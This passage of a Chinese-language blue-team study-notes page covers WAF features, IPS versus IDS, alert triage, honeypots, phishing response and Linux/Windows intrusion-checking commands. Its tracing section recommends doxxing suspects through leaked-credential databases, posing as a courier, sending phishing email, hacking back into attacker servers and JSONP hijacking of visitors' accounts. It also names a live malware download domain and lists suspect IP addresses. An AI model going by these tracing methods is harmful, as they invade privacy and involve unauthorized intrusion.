<p>可根据 IP、Cookie 或者 Referer 字段名设置灵活的限速策略，有效缓解 CC 攻击</p>
<ul>
<li>精准访问防护</li>
</ul>
<p>对常见 HTTP 字段进行条件组合， 支持定制化防护策略如CSRF防护，通过自定义规则的配置，更精准的识别恶意伪造请求、保护网站敏感信息、提高防护精准性</p>
<ul>
<li>IP 黑白名单</li>
</ul>
<p>添加终拦截与始终放行的黑白名单 IP，增加防御准确性</p>
<ul>
<li>地理位置访问控制</li>
</ul>
<p>添加地理位置访问控制规则，针对来源 IP 进行自定义访问控制</p>
<ul>
<li>网页防篡改</li>
</ul>
<p>对网站的静态网页进行缓存配置，当用户访问时返回给用户缓存的正常页面，并随机检测网页是否被篡改</p>
<ul>
<li>网站反爬虫</li>
</ul>
<p>动态分析网站业务模型，结合人机识别技术和数据风控手段，精准识别爬虫行为</p>
<ul>
<li>误报屏蔽</li>
</ul>
<p>针对特定请求忽略某些攻击检测规则，用于处理误报事件</p>
<ul>
<li>隐私屏蔽</li>
</ul>
<p>隐私信息屏蔽，避免用户的密码等信息出现在事件日志中</p>
<ul>
<li>防敏感信息泄露</li>
</ul>
<p>防止在页面中泄露用户的敏感信息，例如：用户的身份证号码、手机号码、电子邮箱等</p>
<h2 id="IPS-入侵防御系统"><a href="#IPS-入侵防御系统" class="headerlink" title="IPS 入侵防御系统"></a>IPS 入侵防御系统</h2><p>IPS可以根据预先设定的安全策略，对流经每个报文进行深度检测(包括协议分析跟踪，特征匹配，流量同合计分析，时间关联分析等),如果一旦发现隐藏的网络攻击，可以根据攻击的威胁级别立即采取措施(措施包括报警警告，丢弃报文，切断应用对话，切断TCP连接)</p>
<p>部署位置有(办公网)：</p>
<ol>
<li>办公网与外网的连接部位(入口&#x2F;出口)</li>
<li>重要服务器集群前端</li>
<li>办公网内部接入层</li>
<li>其他区域根据实际情况和重要程度部署。</li>
</ol>
<h2 id="IDS-入侵检测系统"><a href="#IDS-入侵检测系统" class="headerlink" title="IDS 入侵检测系统"></a>IDS 入侵检测系统</h2><p>IDS入侵检测系统是一个旁路监听设备，不需要跨接到任何链路上，没有流量也可以工作。 IDS应挂接在所有所关注的流量必须流经链路。”所关注流量指的是高危网络区域的访问流量和需要进行统计坚挺的网络报文”。IDS放置的位置在：尽可能靠近攻击源，尽可能靠近受保护资源。</p>
<p>部署位置有：</p>
<ol>
<li>服务器区域的交换机上。</li>
<li>internet接入路由之后的第一台交换机上。</li>
<li>重点保护网端的局域网交换机上。</li>
</ol>
<h3 id="区别"><a href="#区别" class="headerlink" title="区别:"></a>区别:</h3><p>IPS是主动的，通过直接嵌入网络流量中，利用网络端口接收外部流量，经过检查确认器中不包含一场活动或者可疑活动内容，再通过另一个端口转发给内部系统。</p>
<p>IDS是被动的，通过监视网络系统资源，寻找违反安全策略的行为或者攻击。</p>
<h2 id="天眼"><a href="#天眼" class="headerlink" title="天眼"></a>天眼</h2><h3 id="如何查看区分是扫描流量和手动流量"><a href="#如何查看区分是扫描流量和手动流量" class="headerlink" title="如何查看区分是扫描流量和手动流量"></a>如何查看区分是扫描流量和手动流量</h3><p>（扫描数据量大，请求有规律，手动扫描间隔较少）</p>
<h3 id="判断是否攻击成功"><a href="#判断是否攻击成功" class="headerlink" title="判断是否攻击成功:"></a>判断是否攻击成功:</h3><p>查看状态码,请求头是否为恶意payload,查看响应头,请求体无数据</p>
<p>内网攻击莫忽视</p>
<p>内网攻击告警需格外谨慎，可能是进行内网渗透。</p>
<ol>
<li>攻击IP是内网IP，攻击行为不定，主要包括：扫描探测行为、爆破行为、命令执行等漏扫行为。</li>
<li>资产属性-内网攻击IP资产属性。</li>
<li>研判告警行为是否为攻击动作，如弱口令、SQL注入漏洞可能是业务行为。</li>
<li>上级排查与客户一起进一步确认设备问题。</li>
</ol>
<p>企图告警需排查</p>
<p>企图类告警需格外谨慎，可能是“已经成功”。</p>
<ol>
<li>告警主要包括：后门程序、代码行为、命令执行行为。</li>
<li>资产属性+流量确认。</li>
<li>综合判断告警是否成功（成功的话就需要提供证据给规则反馈）。</li>
<li>上级排查与客户一起进一步确认设备问题。</li>
</ol>
<p>爆破行为也要看</p>
<p>爆破攻击告警需格外谨慎，可能是“正在进行时”。</p>
<ol>
<li>告警主要包括：客户对外端口的服务对外开放。</li>
<li>资产属性+流量确认。</li>
<li>综合判断业务是否对外开放（及时确认是否需要规避风险点）。</li>
</ol>
<p>成功失陷追仔细</p>
<p>成功失陷追仔细，可能是”溯源不够细致，遗漏蛛丝马迹“。</p>
<ol>
<li>告警主要包括：成功+失陷的告警。</li>
<li>资产属性+流量确认+告警确认+数据分析+兄弟产品跟进。</li>
<li>协助客户上机排查，书写溯源报告。</li>
</ol>
<h2 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h2><ul>
<li>创建虚拟环境：在网络中创建一个看似易受攻击的虚拟环境，该环境模拟真实系统的一部分或全部功能，包括应用程序、服务和操作系统。</li>
<li>引诱攻击者：通过暴露蜜罐的存在，例如通过公开可访问的IP地址或虚假的网站，吸引攻击者主动尝试入侵、扫描或攻击蜜罐系统。</li>
<li>监测和记录：一旦攻击者进入蜜罐系统，蜜罐会记录攻击者的行为、攻击技术和使用的工具。这些信息对于理解攻击者的策略和行为非常有价值。</li>
<li>分析和响应：通过分析记录的数据，研究人员可以识别攻击者的行为模式、漏洞利用方法和漏洞的目标。这些信息可以用于改进真实系统的安全性，及时发现和应对新的威胁。</li>
<li>蜜罐的优势在于能够提供高质量的攻击数据和情报，帮助安全团队更好地了解攻击者的行为模式和目的，加强防御措施并及时应对威胁。</li>
<li>然而，蜜罐也需要专业人员来设计、部署和管理，以确保其安全性和有效性，并避免对真实系统造成潜在的风险。</li>
</ul>
<h2 id="区别-1"><a href="#区别-1" class="headerlink" title="区别"></a>区别</h2><p>基础防火墙类，主要是可实现基本包过滤策略的防火墙，这类是有硬件处理、软件处理等，其主要功能实现是限制对IP:port的访问。基本上的实现都是默认情况下关闭所有的通过型访问，只开放允许访问的策略。</p>
<p>IDS类，此类产品基本上以旁路为主，特点是不阻断任何网络访问，主要以提供报告和事后监督为主，少量的类似产品还提供TCP阻断等功能，但少有使用。</p>
<p>IPS类，解决了IDS无法阻断的问题，基本上以在线模式为主，系统提供多个端口，以透明模式工作。在一些传统防火墙的新产品中也提供了类似功能，其特点是可以分析到数据包的内容，解决传统防火墙只能工作在4层以下的问题。和IDS一样，IPS也要像防病毒系统定义N种已知的攻击模式，并主要通过模式匹配去阻断非法访问。</p>
<p>传统的IPS通常只对事中有效，也就是检查和防护攻击事件，WAF是事前（扫描）和事后（防篡改）</p>
<p>APT是预警，天眼是全流量检测和威胁检测</p>
<h1 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h1><p><img src="/photo/2241537-20210301132705366-1651671366.png" alt="img"></p>
<p>定位IP：通过ip反查域名，查询域名注册信息，域名注册人及右键信息等</p>
<p>通过ID：通过定位ID定位攻击者使用同类ID注册过的微博或者博客，论坛买手机号，邮箱，qq等信息</p>
<p>反制vps：反制攻击者vps，获取攻击者vps中的敏感信息，反钓鱼，恶意程序分析等</p>
<p>手机号定位：通过对手机号码定位，一是通过添加某信好友查看头像、昵称、城市等；二是通过添加某宝，可以查看其部分实名信息、头像、城市、动态等；三是可以假装送外卖、送快递的，询问是不是某人，某地址等，进一步核实信息。</p>
<p>邮箱定位：通过对邮箱定位，一是通过添加某宝，查看其部分实名信息、头像、城市、动态等（可以未通过邮箱主持）；二是发送钓鱼邮件，控制邮箱或者掌握IP地址。</p>
<h2 id="发现进攻者ip后的溯源流程"><a href="#发现进攻者ip后的溯源流程" class="headerlink" title="发现进攻者ip后的溯源流程"></a>发现进攻者ip后的溯源流程</h2><ol>
<li>首先通过ipip.net网站或者其他接口，查询此ip为IDC的IP，CDN的IP还是真实IP。</li>
<li>如果是真实IP，反查到域名就可以去站长之家或者whois.domain.com等网站去查询域名的注册信息。</li>
<li>如果不是真实ip，就需要像红队进攻思路一样先寻找到真实ip，可以采取反钓，邮件等方法，</li>
<li>假如是普通运营商的出口IP只能使用一些高精度IP定位工具粗略估计攻击者的地址，如果需要具体定位到人，则需要更多的信息。</li>
</ol>
<h2 id="ID追踪技术"><a href="#ID追踪技术" class="headerlink" title="ID追踪技术"></a>ID追踪技术</h2><p>通过IP定位攻击者之后，可以通过指纹库，社工库等一些库抓取到攻击者的微博账号，qq账号，微信账号等信息。</p>
<ol>
<li>进行qq等同名方式搜索，在各个地方进行匹配。</li>
<li>如果id是邮箱，则可以通过社工库匹配密码，注册信息等。</li>
<li>如果id是手机号，可以通过手机号搜索相关信息，以及手机号使用者的姓名等。</li>
</ol>
<p>Eg：通过id技术定位到某个攻击者qq号等信息时，通过专业的社工库可以进一步追踪攻击者使用的qq号注册的其他网络id获取更多的信息。</p>
<h2 id="蜜罐的捕获"><a href="#蜜罐的捕获" class="headerlink" title="蜜罐的捕获"></a>蜜罐的捕获</h2><p>蜜罐可以捕获到一下信息()</p>
<ol>
<li>攻击源IP (物理位置)</li>
<li>设备指纹信息：(某某操作希洪，xx浏览器进行的攻击)</li>
<li>攻击次数，攻击时常</li>
<li>攻击链条:(时间–攻击了哪–攻击源)</li>
</ol>
<p>设置蜜罐(email,tomcat,hseepaper蜜罐)可以捕获到攻击者的真实ip和端口，以及攻击者进行了什么样子的攻击行为，是否挂代理，是进行的探测还是攻击。</p>
<h3 id="email蜜罐"><a href="#email蜜罐" class="headerlink" title="email蜜罐"></a>email蜜罐</h3><p>据悉，首先进行信息探测踩点对email蜜罐，攻击源的IP为43.250.200.16【<strong>湖南省 联通</strong>】，去尝试访问80端口建立tcp的连接。</p>
<p><img src="/photo/1596927265.png" alt="img"></p>
<h3 id="tomcat蜜罐"><a href="#tomcat蜜罐" class="headerlink" title="tomcat蜜罐"></a>tomcat蜜罐</h3><p>对tomcat蜜罐也进行了探测建立了tcp的连接，攻击源IP为 175.0.52.248 【<strong>湖南省长沙市 电信</strong>】</p>
<p><img src="/photo/1596927285.png" alt="img"></p>
<h3 id="HSE蜜罐"><a href="#HSE蜜罐" class="headerlink" title="HSE蜜罐"></a>HSE蜜罐</h3><p>对HSE蜜罐进行大量攻击访问 次数达615次</p>
<p><img src="/photo/1596927308.png" alt="img"></p>
<p>目录遍历进行尝试访问</p>
<p><img src="/photo/1596925836.png" alt="img"></p>
<p>更换代理IP进行目录遍历攻击，地址 116.162.3.91 【<strong>湖南省 联通</strong>】</p>
<p><img src="/photo/1596927399.png" alt="img"></p>
<p>更换代理IP进行命令执行攻击，通过执行POST请求的攻击方式，地址 175.0.52.248【<strong>湖南省长沙市 电信</strong>】</p>
<p><img src="/photo/1596927417.png" alt="img"></p>
<p>更换代理IP进行命令攻击，地址 220.202.152.25【<strong>湖南省 联通</strong>】</p>
<p><img src="/photo/1596927435.png" alt="img"></p>
<h3 id="蜜罐中捕获网络ID-邮箱"><a href="#蜜罐中捕获网络ID-邮箱" class="headerlink" title="蜜罐中捕获网络ID (邮箱)"></a>蜜罐中捕获网络ID (邮箱)</h3><p>根据邮箱的数字猜测qq号还是xx账号，对支付宝，微博等进行查看，进行社工。</p>
<p>(主要是获取攻击者cookie)</p>
<h3 id="蜜罐获取第三方信息溯源"><a href="#蜜罐获取第三方信息溯源" class="headerlink" title="蜜罐获取第三方信息溯源"></a>蜜罐获取第三方信息溯源</h3><p>要求:</p>
<ol>
<li>登陆过第三方网站且未退出登录。</li>
<li>第三方网站接口能获取敏感信息(账号，ip，邮箱等)，且允许跨域资源共享。</li>
<li>大部分使用jsonp接口，这种接口允许跨域资源共享，这种攻击又称为JSONHijacking.</li>
</ol>
<p>流程：攻击者发送请求给蜜罐–&gt;蜜罐返回第三方站点的接口给攻击者–&gt;攻击者访问第三方网站–&gt;返回攻击者在第三方站点登录过的账号信息–&gt;第三方信息发送给蜜罐获取第三方信息</p>
<p>第三方可以包括:社交，购物，娱乐等平台接口。</p>
<h2 id="获得了攻击者IP如何进行溯源，获得攻击者的个人信息"><a href="#获得了攻击者IP如何进行溯源，获得攻击者的个人信息" class="headerlink" title="获得了攻击者IP如何进行溯源，获得攻击者的个人信息"></a>获得了攻击者IP如何进行溯源，获得攻击者的个人信息</h2><ol>
<li>攻击者IP是什么多少(蜜罐，日志，设备能查到)，IP的信息 通过ipip.net查询</li>
<li>根据IP的范围判断地址的范围。</li>
<li>然后对IP进行反向渗透，信息收集，社工，扫描等。</li>
<li>ip反查域名，看能否得到攻击者的邮箱，博客等地址，利用ID 定位</li>
</ol>
<h1 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a>钓鱼邮件</h1><ol>
<li>屏蔽办公区域对钓鱼邮件内容涉及站点、URL 访问</li>
</ol>
<p>根据办公环境实际情况可以在上网行为管理、路由器、交换机上进行屏蔽</p>
<p>邮件内容涉及域名、IP 均都应该进行屏蔽</p>
<p>对访问钓鱼网站的内网 IP 进行记录，以便后续排查溯源可能的后果</p>
<ol>
<li>屏蔽钓鱼邮件</li>
</ol>
<p>屏蔽钓鱼邮件来源邮箱域名</p>
<p>屏蔽钓鱼邮件来源 IP</p>
<p>有条件的可以根据邮件内容进行屏蔽</p>
<p>删除还在邮件服务器未被客户端收取钓鱼邮件</p>
<ol>
<li>处理接收到钓鱼邮件的用户</li>
<li>根据钓鱼邮件发件人进行日志回溯<br>此处除了需要排查有多少人接收到钓鱼邮件之外，还需要排查是否公司通讯录泄露。采用 TOP500 姓氏撞库发送钓鱼邮件的攻击方式相对后续防护较为简单。如果发现是使用公司通讯录顺序则需要根据通讯录的离职情况及新加入员工排查通讯录泄露时间。毕竟有针对性的社工库攻击威力要比 TOP100、TOP500 大很多</li>
<li>通知已接收钓鱼邮件的用户进行处理</li>
<li><strong>删除钓鱼邮件</strong></li>
<li><strong>系统改密</strong></li>
<li><strong>全盘扫毒</strong></li>
</ol>
<p>防范内存马</p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>查看邮件内容，是否包含域名钓鱼链接或附件样本</p>
<p>利用威胁情报查看域名，沙箱查杀附件</p>
<p>分析附件，恶意文件运行调试后会访问域名“sterilizationvalidation.com”下载PE文件“elb.exe”，其功能与Agent tesla木马相同。通过路径看，是利用一个存在漏洞的WordPress网站作为C&amp;C节点</p>
<p>流量分析</p>
<p>下载请求</p>
<p>恶意文件通过SMTP流量将从主机中获得的数据发送出去：</p>
<p>从流量上看，攻击者通过mailhostbox邮箱服务商，登陆设定好的邮箱给自己发送了一封邮件，邮件内容是受害主机内的相关应用账号密码。</p>
<p>SMTP协议数据包</p>
<p>发送受害者信息的同时，攻击者也在数据包中暴露了收件邮箱的账号密码。对数据解密后，安全专家成功登陆攻击者的收件邮箱</p>
<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h2 id="应急前期的入侵排查"><a href="#应急前期的入侵排查" class="headerlink" title="应急前期的入侵排查"></a>应急前期的入侵排查</h2><p>前期的入侵排查要做的就是两件事，一是减小攻击面，二是排查风险点。</p>
<p>减小攻击面：</p>
<ol>
<li>首先通过收集到的客户资产进行爬取相关链接，确定是否无用界面无用系统下挂关键系统域名。</li>
<li>接着对一些已经业务需求不那么高的，无用的系统，闲置的服务器进行处理。</li>
<li>最后对于用一定业务需求用户较少的系统迁入内网，通过VPN操作。、</li>
<li>缩小暴露资产，仅对外开放个别端口。</li>
</ol>
<p>排查风险：</p>
<p>对于入侵排查需要明白一件事情：目前情况是已经被入侵，还是正在被入侵。</p>
<h2 id="正在被入侵时排查"><a href="#正在被入侵时排查" class="headerlink" title="正在被入侵时排查"></a>正在被入侵时排查</h2><p>正在被入侵是指攻击正正在尝试进行攻击。</p>
<ol>
<li>存在弱口令爆破，爆破弱口令时会产生日志，日志中会有详细记录(比如ip，端口，时间，有的什么扫描)，所以日志一定要采用远程日志系统(例如linux，rsyslog)。开启远程日志系统的好处：不怕日志被攻击者删除使防守方察觉不到。</li>
<li>正在被入侵时通过看设备的报警分析，或者是防火墙的阻断信息，即使的发阻断策略。</li>
</ol>
<h2 id="已经被入侵"><a href="#已经被入侵" class="headerlink" title="已经被入侵"></a>已经被入侵</h2><h3 id="一-目标已经达成，木马，后门已经被销毁"><a href="#一-目标已经达成，木马，后门已经被销毁" class="headerlink" title="一.目标已经达成，木马，后门已经被销毁"></a>一.目标已经达成，木马，后门已经被销毁</h3><ol>
<li>如果服务器是云服务器，对其进行快照处理(目的：封存内存)</li>
<li>定位被入侵的时间(设备，waf，日志)</li>
<li>定位到时间以后查看设备流量信息，找到木马链接信息。</li>
<li>查找系统内对应的日志，找到相关线索。</li>
<li>如果日志被删除，可以使用winhex对硬盘数据进行恢复。</li>
</ol>
<h3 id="二-目的还没有达成，数据正在回传。木马，后门还在"><a href="#二-目的还没有达成，数据正在回传。木马，后门还在" class="headerlink" title="二.目的还没有达成，数据正在回传。木马，后门还在"></a>二.目的还没有达成，数据正在回传。木马，后门还在</h3><ol>
<li>volatility内存取整，恢复快照，定位shellcode找到IP</li>
<li>如果能找到他们使用的c2工具，可以根据流量分析攻击者的意图</li>
<li>暂时关闭服务器，或者再防火墙上ban掉IP，登录服务器对shellcode进行移除。</li>
<li>排查注册表，计划任务，服务，放大镜后门，shift后门等。</li>
</ol>
<h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程:"></a>基本流程:</h2><p>网络隔离,防止横向传播</p>
<p>​	Windows进入安全模式,进行脚本还原</p>
<p>服务甄别</p>
<p>检查可疑进程</p>
<p>Windows:(查看异常端口,外联情况,进程没有签名信息,子进程,守护进程,)启动项,计划任务,服务</p>
<p>Linux:历史命令,端口,进程,开机启动项,定时任务,服务,     终端执行命令</p>
<p>查看Windows服务所对应的端口： C:\Windows &#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;services</p>
<p>定位服务</p>
<p>Linux:ls -l &#x2F;proc&#x2F;PID&#x2F;exe</p>
<p>Windows:wmic ,然后输入process where（Description&#x3D;”Taskmgr.exe”)</p>
<p>查看日志</p>
<p>复原攻击链</p>
<h2 id="Linux入侵排查命令"><a href="#Linux入侵排查命令" class="headerlink" title="Linux入侵排查命令"></a>Linux入侵排查命令</h2><h3 id="一、敏感目录"><a href="#一、敏感目录" class="headerlink" title="一、敏感目录"></a>一、敏感目录</h3><h4 id="1-1-tmp目录"><a href="#1-1-tmp目录" class="headerlink" title="1.1 tmp目录"></a>1.1 tmp目录</h4><blockquote>
<p>在Linux系统下一切都是文件。 其中 <code>/tmp</code> 是一个特别的临时文件。每个用户都可以对它进行读写操作。因此一个<code>普通用户可以对 /tmp 目录执行读写操作</code> ， <code>ls -t : 根据最后修改时间排序</code></p>
</blockquote>
<p><img src="/photo/2211919-20240409133828671-36683526-171991575878113.png" alt="img"></p>
<h4 id="1-2-开机自启动目录"><a href="#1-2-开机自启动目录" class="headerlink" title="1.2 开机自启动目录"></a>1.2 开机自启动目录</h4><blockquote>
<p>查看开机启动项内容 <code>/etc/init.d/</code> ，恶意代码很有可能设置在开机自启动的位置。</p>
<p>开机完成前最后读取的一个文件<code>/etc/rc.local</code> 也会写一些开启启动程序</p>
</blockquote>
<p><img src="/photo/2211919-20240409133907451-811880417-171991575878115.png" alt="img"></p>
<h4 id="1-3-基于时间和权限的筛选"><a href="#1-3-基于时间和权限的筛选" class="headerlink" title="1.3 基于时间和权限的筛选"></a>1.3 基于时间和权限的筛选</h4><blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find 命令查找</span><br></pre></td></tr></table></figure>

<p>查找24 小时内被修改的php文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ <span class="literal">-mtime</span> <span class="number">0</span>  <span class="literal">-name</span> <span class="string">&quot;*.php&quot;</span></span><br></pre></td></tr></table></figure>

<p>查找72小时内新增的php文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find  ./ <span class="literal">-ctime</span> <span class="literal">-2</span> <span class="literal">-name</span> <span class="string">&quot;*.php&quot;</span></span><br></pre></td></tr></table></figure>

<p>查找 权限777权限的文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ <span class="literal">-type</span> f  <span class="literal">-perm</span> <span class="number">777</span> </span><br></pre></td></tr></table></figure></blockquote>
<h3 id="二、可疑网络连接分析与关闭"><a href="#二、可疑网络连接分析与关闭" class="headerlink" title="二、可疑网络连接分析与关闭"></a>二、可疑网络连接分析与关闭</h3><blockquote>
<p><code>netstat</code> 查看网络连接</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出正在监听的tcp/udp 协议的连接</span></span><br><span class="line">netstat <span class="literal">-nlupt</span></span><br></pre></td></tr></table></figure>

<p>查看正在建立连接的端口</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat <span class="literal">-pantul</span> | grep <span class="string">&quot;ESTABLISHED&quot;</span></span><br></pre></td></tr></table></figure></blockquote>
<h3 id="三、-进程所对应文件分析"><a href="#三、-进程所对应文件分析" class="headerlink" title="三、 进程所对应文件分析"></a>三、 进程所对应文件分析</h3><blockquote>
<p><code>ps aux</code> : 查看 所有进程消息</p>
<p><code>ps -ef</code> ： 查看 所有进程消息</p>
</blockquote>
<h3 id="四、-异常登录分析"><a href="#四、-异常登录分析" class="headerlink" title="四、 异常登录分析"></a>四、 异常登录分析</h3><blockquote>
<p><code>last</code> : 查看最近登录ip</p>
<p><code>lastlog</code> : 查看用户的最后登录时间</p>
<p><code>w</code> : 实时登录查看</p>
<p><code>who</code> : 实时登录查看</p>
<p><code>pkill -kill -t pts/1 : 踢某个终端的用户下线</code>(配合 who 命令使用)</p>
<p><code>uptime</code> : 当前在线用户查看</p>
<p><code>loginctl -a</code> : 显示所有会话及属性</p>
<p><code>loginctl kill-session ID</code> :踢某个session的用户下线</p>
</blockquote>
<h3 id="五、异常用户分析与排查"><a href="#五、异常用户分析与排查" class="headerlink" title="五、异常用户分析与排查"></a>五、异常用户分析与排查</h3><blockquote>
<p>文件：<code>/etc/passwd</code></p>
<p>在linux 中 <code>root用户为超级管理员</code> ，可以在Linux 上做任何事情。</p>
<p>在Linux 中 <code>uid 为 0</code> 或 <code>gid 为 0</code>，都为最高权限的用户或用户组去执行命令。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询所有用户</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询所有用户的 uid和 gid</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd  |  awk  <span class="operator">-F</span> : <span class="string">&#x27;&#123;print $1,$3,$4&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询uid=0 或者gid=0 的用户</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd  |  awk  <span class="operator">-F</span> : <span class="string">&#x27;&#123;if($3==0 || $4==0) print $1,$3,$4&#125;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote>
<h3 id="六、-历史命令"><a href="#六、-历史命令" class="headerlink" title="六、 历史命令"></a>六、 历史命令</h3><blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 历史命令加上时间</span></span><br><span class="line">vim /etc/profile </span><br><span class="line"><span class="comment"># 最后一行加上  ，显示输入命令时间</span></span><br><span class="line"></span><br><span class="line">export HISTTIMEFORMAT=<span class="string">&quot;%F %T `whoami` &quot;</span></span><br></pre></td></tr></table></figure>

<p>文件： <code>/root/.bash_history</code></p>
<p>命令： <code>history</code></p>
<p><img src="/photo/2211919-20240409133928242-2060468829.png" alt="img"></p>
<p>特别注意： wget（远程下载） 、 ssh（远程连接）、 tar（解压）、 zip（解压压缩）、 sed -i （修改文件）</p>
</blockquote>
<h3 id="七、-计划任务"><a href="#七、-计划任务" class="headerlink" title="七、 计划任务"></a>七、 计划任务</h3><blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab</span><br></pre></td></tr></table></figure>

<p>-e : 编辑</p>
<p>-l ： 列出当前计划任务</p>
<p>-r ： 删除计划任务</p>
<p>相关文件：</p>
</blockquote>
<h3 id="八、开机启动项"><a href="#八、开机启动项" class="headerlink" title="八、开机启动项"></a>八、开机启动项</h3><blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># centos7 中用的systemctl</span></span><br><span class="line">systemctl list<span class="literal">-unit-files</span> <span class="literal">--type</span>=service | grep enabled</span><br><span class="line"></span><br><span class="line"><span class="comment"># centos6 中默认使用chkconfig</span></span><br><span class="line">chkconfig <span class="literal">--list</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 还有就是文件内容有没有恶意写入</span></span><br><span class="line">vim /etc/rc.local</span><br></pre></td></tr></table></figure></blockquote>
<h3 id="九、异常环境变量排查"><a href="#九、异常环境变量排查" class="headerlink" title="九、异常环境变量排查"></a>九、异常环境变量排查</h3><blockquote>
<p>环境变量 <code>$PATH</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前环境变量</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 临时添加环境变量</span></span><br><span class="line">export   PATH=<span class="variable">$PATH:</span>/新添加的环境变量路径</span><br><span class="line"></span><br><span class="line"><span class="comment">#排查有没有恶意路径的环境变量</span></span><br></pre></td></tr></table></figure>

<p><img src="/photo/2211919-20240409133951513-1829479876.png" alt="img"></p>
</blockquote>
<img src="photo/image-20240609232745059.png" alt="image-20240609232745059" style="zoom: 67%;" />

<p><img src="/photo/image-20240609233000128.png" alt="image-20240609233000128"></p>
<p><img src="/photo/image-20240609233149464.png" alt="image-20240609233149464"></p>
<h2 id="windows入侵排查"><a href="#windows入侵排查" class="headerlink" title="windows入侵排查"></a>windows入侵排查</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yj520400/article/details/136908768">https://blog.csdn.net/yj520400/article/details/136908768</a></p>
<h4 id="一、检查系统账号安全"><a href="#一、检查系统账号安全" class="headerlink" title="一、检查系统账号安全"></a>一、检查系统账号安全</h4><p>攻击者面对windows系统会先从用户密码入手，首先是通过rdp服务对Administrator、Guest等默认账户的口令爆破，如果爆破没结果的话会固定密码，对用户账号进行爆破，再之后加入还是失败的话就是社工生成账号、密码字典，运气好那么就可以直接登录到管理员账号。在拿到系统权限后，权限维持则是必不可少的一步，创造一个新的管理账号方便后期登录查看就是一个不错的方法，当然为了增加隐蔽性该账号可以是影子账户。根据这几方面，检查看系统账号时可以重点关注弱口令、可疑账号、影子账户。</p>
<h5 id="（一）排查服务器弱口令"><a href="#（一）排查服务器弱口令" class="headerlink" title="（一）排查服务器弱口令"></a>（一）排查服务器弱口令</h5><p>检查方法：</p>
<p>尝试使用弱口令登录爆破或直接咨询管理员<br><img src="/photo/ed6f9e9461efe00fddfad8d089817bc6.jpeg" alt="img"></p>
<h5 id="（二）排查可疑账号、新增账号"><a href="#（二）排查可疑账号、新增账号" class="headerlink" title="（二）排查可疑账号、新增账号"></a>（二）排查可疑账号、新增账号</h5><p>检查方法：</p>
<blockquote>
<p>1、打开 <a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=cmd&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22607999114%22%7D">cmd</a>窗口，输入 lusrmgr.msc 2、查看是否存在可疑账号，特别是管理员群组（Administrators）中的新增账号，如果存在需要立即删除或禁用</p>
</blockquote>
<p><img src="/photo/230f7614b002bd5989501ba03c14b8a0.jpeg" alt="img"></p>
<h5 id="（三）排查隐藏账号"><a href="#（三）排查隐藏账号" class="headerlink" title="（三）排查隐藏账号"></a>（三）排查隐藏账号</h5><p>检查方法1：</p>
<p>打开注册表，查看管理员对应键值 1、在桌面打开运行（可使用快捷键 win+R），输入 regedit，打开 注册表编辑器 2、选择 HKEY_LOCAL_MACHINE&#x2F;SAM&#x2F;SAM，默认无法查看该选项内容，右键菜单选择权限，打开 权限管理窗口 3、选择当前用户（一般为 administrator），将权限勾选为完全控制，然后确定并关闭注册表编辑器 4、再次打开注册表编辑器，即可选择 HKEY_LOCAL_MACHINE&#x2F;SAM&#x2F;SAM&#x2F;Domains&#x2F;Account&#x2F;Users 5、在 Names 项下可以看到实例所有用户名，如出现本地账户中没有的账户，即为隐藏账户，在确认为非系统用户的前提下，可删除此用户</p>
<p><img src="/photo/bb8e072c79b174b10fd1a458fb719d6e.jpeg" alt="img"></p>
